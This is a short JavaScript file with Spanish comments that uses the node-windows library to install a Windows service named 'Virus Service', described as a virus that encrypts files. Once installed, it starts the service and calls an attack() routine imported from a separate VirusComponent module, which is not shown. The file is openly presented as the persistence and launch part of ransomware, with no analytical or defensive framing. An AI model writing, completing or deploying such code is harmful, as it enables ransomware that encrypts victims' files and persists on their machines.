import { Service } from 'node-windows';
import { VirusComponent } from './index.js'; 

const virus = new VirusComponent(); 

const svc = new Service({
  name: 'Virus Service',
  description: 'Virus que encripta archivos',
  script: 'index.js' 
});

svc.on('install', function() {
  svc.start();

  // Llama a la función attack() después de que el servicio se instale y se inicie
  virus.attack().catch(error => {
    console.error('Error al ejecutar la función attack():', error);
  });
});

// Instala el servicio
svc.install();
